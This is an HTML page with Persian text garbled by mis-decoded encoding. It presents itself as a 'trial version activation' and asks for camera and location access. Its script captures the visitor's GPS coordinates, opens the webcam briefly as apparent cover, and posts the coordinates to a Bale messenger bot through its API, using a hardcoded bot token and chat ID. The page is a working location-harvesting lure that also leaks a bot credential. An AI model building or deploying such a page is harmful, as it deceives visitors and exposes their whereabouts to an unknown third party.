<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ù†Ø³Ø®Ù‡ Ø¢Ø²Ù…Ø§ÛŒØ´ÛŒ</title>

<style>
body{
    margin:0;
    font-family:tahoma;
    background:#f2f2f2;
    text-align:center;
}
.card{
    background:white;
    width:90%;
    max-width:350px;
    margin:40px auto;
    padding:25px;
    border-radius:15px;
    box-shadow:0 5px 15px rgba(0,0,0,0.1);
}
button{
    padding:12px 20px;
    border:none;
    background:#28a745;
    color:white;
    font-size:16px;
    border-radius:10px;
    cursor:pointer;
    margin-top:10px;
}
button:disabled{
    background:gray;
}
video{
    width:100%;
    max-width:300px;
    margin-top:15px;
    border-radius:10px;
}
#status{
    margin-top:10px;
    font-size:14px;
}
</style>
</head>

<body>

<div class="card">
    <h2>ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ù†Ø³Ø®Ù‡ Ø¢Ø²Ù…Ø§ÛŒØ´ÛŒ</h2>
    <p>Ø¨Ø±Ø§ÛŒ Ø§Ø¯Ø§Ù…Ù‡ØŒ Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ù„Ø§Ø²Ù… Ø§Ø³Øª.</p>

    <button onclick="startProcess()">Ø´Ø±ÙˆØ¹</button>

    <video id="video" autoplay playsinline></video>

    <button id="sendBtn" onclick="sendToBale()" disabled>Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø±Ø¨Ø§Øª Ø¨Ù„Ù‡</button>

    <p id="status"></p>
</div>

<script>

let latitude = null;
let longitude = null;

// ğŸ‘‡ğŸ‘‡ğŸ‘‡ Ø§ÛŒÙ†Ø¬Ø§ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø±Ø¨Ø§ØªØªÙˆ Ø¨Ú¯Ø°Ø§Ø±
const TOKEN = "1304649351:weEWKYDatAUMOxkNDwJXhoT0iheuhPfMpkw";
const CHAT_ID = "2048601939";
// ğŸ‘†ğŸ‘†ğŸ‘†

async function startProcess(){

    const status = document.getElementById("status");
    const sendBtn = document.getElementById("sendBtn");

    status.innerHTML = "Ø¯Ø± Ø­Ø§Ù„ Ø¯Ø±ÛŒØ§ÙØª Ø§Ø·Ù„Ø§Ø¹Ø§Øª...";

    try{

        await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
                position => {
                    latitude = position.coords.latitude;
                    longitude = position.coords.longitude;
                    status.innerHTML = "Ù„ÙˆÚ©ÛŒØ´Ù† Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯ âœ…";
                    resolve();
                },
                error => {
                    status.innerHTML = "Ø§Ø¬Ø§Ø²Ù‡ Ù„ÙˆÚ©ÛŒØ´Ù† Ø¯Ø§Ø¯Ù‡ Ù†Ø´Ø¯ âŒ";
                    reject(error);
                }
            );
        });

        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;

        setTimeout(()=>{
            stream.getTracks().forEach(track => track.stop());
            status.innerHTML += "<br>Ø¯ÙˆØ±Ø¨ÛŒÙ† ÙØ¹Ø§Ù„ Ø´Ø¯ ğŸ“¸";
            sendBtn.disabled = false;
        },2000);

    }catch(err){
        status.innerHTML = "Ø®Ø·Ø§: " + err.message;
    }
}

async function sendToBale(){

    const status = document.getElementById("status");

    if(latitude === null || longitude === null){
        status.innerHTML += "<br>Ù„ÙˆÚ©ÛŒØ´Ù† Ø¢Ù…Ø§Ø¯Ù‡ Ù†ÛŒØ³Øª â—";
        return;
    }

    status.innerHTML += "<br>Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„...";

    try{

        const response = await fetch(`https://tapi.bale.ai/bot${TOKEN}/sendMessage`,{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                chat_id: CHAT_ID,
                text:`ğŸ“ Ù„ÙˆÚ©ÛŒØ´Ù†:\nLat:${latitude}\nLon:${longitude}`
            })
        });

        const data = await response.json();

        if(data.ok){
            status.innerHTML += "<br>Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙÙ‚ âœ…";
        }else{
            status.innerHTML += "<br>Ø®Ø·Ø§ÛŒ API: " + JSON.stringify(data);
        }

    }catch(err){
        status.innerHTML += "<br>Ø®Ø·Ø§ÛŒ CORS â€” Ù†ÛŒØ§Ø² Ø¨Ù‡ Ø³Ø±ÙˆØ± ÙˆØ§Ø³Ø· âŒ";
    }
}

</script>

</body>
</html>